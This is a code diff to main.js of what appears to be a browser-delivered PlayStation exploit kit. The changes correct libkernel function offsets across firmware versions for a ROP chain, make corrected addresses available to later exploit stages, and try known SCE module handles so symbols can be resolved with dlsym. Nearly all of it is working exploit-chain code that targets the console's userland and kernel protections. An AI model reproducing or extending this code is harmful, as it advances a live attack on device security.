@@ -409,7 +409,7 @@ async function prepare(p) {
        cache-buster, so a reload can serve a stale page that still references an
        old main.js -- twice now a run has been analysed as if it contained a
        change it did not. Stamp the build on screen so that is never in doubt. */
-    jbmark("BUILD", "main.js v=53 | if this is not the version just"
+    jbmark("BUILD", "main.js v=54 | if this is not the version just"
         + " pushed, the console is running a CACHED page and the run means"
         + " nothing -- force a reload");
 
@@ -513,6 +513,9 @@ async function prepare(p) {
         const clean = (rows) => rows.filter(r => r[1] > -0x100000
             && r[1] < 0x100000);
         const byRva = (a, b) => a[0] - b[0];
+        /* Published on SHIFT so the same rule can correct the OFFSET_lk_*
+           function constants later, rather than being reimplemented there. */
+        SHIFT.publish = (rows) => { SHIFT.at = (rva) => at(rows, rva); };
 
         try {
             /* libc's GOT is a second, denser view of the same thing: it
@@ -547,6 +550,7 @@ async function prepare(p) {
             /* Only the steps over the syscall stub block are worth screen
                space; libkernel_web is a 15-step staircase and printing all of
                it pushes the actual run off the top. */
+            SHIFT.publish(lkRows);
             report("SHIFT-LK", steps(lkRows), 0x33000, 0x39000);
             const lcRows = clean(viaGot(OFFSET_lc_import_landmarks, lcN))
                 .sort(byRva);
@@ -1480,6 +1484,43 @@ async function prepare(p) {
     };
 
     p2.LC_SOURCED = LC_SOURCED;
+    /* Every OFFSET_lk_* TEXT constant is still a 7_00_00_44 address. The
+       syscall stubs were corrected because syscall_map is a mutable object;
+       these are `const`, so nothing could rewrite them, and SHIFT-TODO has
+       been reporting that for several runs without anything acting on it.
+       rop.js calls pthread_exit and pthread_create_name_np, and poops.js
+       builds its whole LK_* table out of them, so stage 5 would jump into the
+       middle of whatever .70 put at the .44 address.
+
+       Expose the same bracket rule the stubs use instead: shifted where the
+       landmarks either side agree, and left alone -- loudly -- where they do
+       not, because a wrong function pointer is worse than a missing one. */
+    p2.lkfix = (rva) => rva + (typeof SHIFT.at === "function"
+        ? (SHIFT.at(rva) || 0) : 0);
+    if (typeof SHIFT.at === "function") {
+        const names = {
+            pthread_exit: typeof OFFSET_lk_pthread_exit === "number"
+                ? OFFSET_lk_pthread_exit : null,
+            pthread_create_name_np:
+                typeof OFFSET_lk_pthread_create_name_np === "number"
+                    ? OFFSET_lk_pthread_create_name_np : null,
+            scePthreadCreate: typeof OFFSET_lk_scePthreadCreate === "number"
+                ? OFFSET_lk_scePthreadCreate : null,
+            sysctlbyname: typeof OFFSET_lk_sysctlbyname === "number"
+                ? OFFSET_lk_sysctlbyname : null,
+        };
+        const unresolved = [];
+        let moved = 0;
+        for (const k in names) {
+            if (names[k] === null) continue;
+            const d = SHIFT.at(names[k]);
+            if (d === null) unresolved.push(k); else if (d) moved++;
+        }
+        jbmark("SHIFT-LKFUNC", moved + " of " + Object.keys(names).length
+            + " libkernel functions shift"
+            + (unresolved.length ? " | UNRESOLVED: " + unresolved.join(",")
+                + " -- stage 5 must not call these" : " | all resolved"));
+    }
 
     let chain = new worker_rop(p2);
 
@@ -1581,8 +1622,13 @@ async function prepare(p) {
                     + handles.slice(0, 12).join(",")
                     : "get_list returned " + r.low + " -- falling back to a sweep");
             }
-            if (!handles.length)
-                for (let h = 0; h <= 64; h++) handles.push(h);
+            /* poops.js has carried LIBKERNEL_HANDLE 0x2001 and LIBC_HANDLE
+               0x2 since long before this port -- SCE module handles are not
+               small sequential integers, which is why sweeping 0..24 found
+               nothing and why that sweep proved nothing either. Try the known
+               ones first, then whatever get_list returned, then a sweep. */
+            handles = [0x2001, 0x2, 0x2000, 0x1].concat(handles);
+            for (let h = 0; h <= 64; h++) handles.push(h);
             /* Validate before believing: the right module is the one whose
                dlsym answer for getpid matches the address already read out of
                the GOT. Two name forms, because the loader may want the bare
@@ -2188,4 +2234,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=53`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=54`);
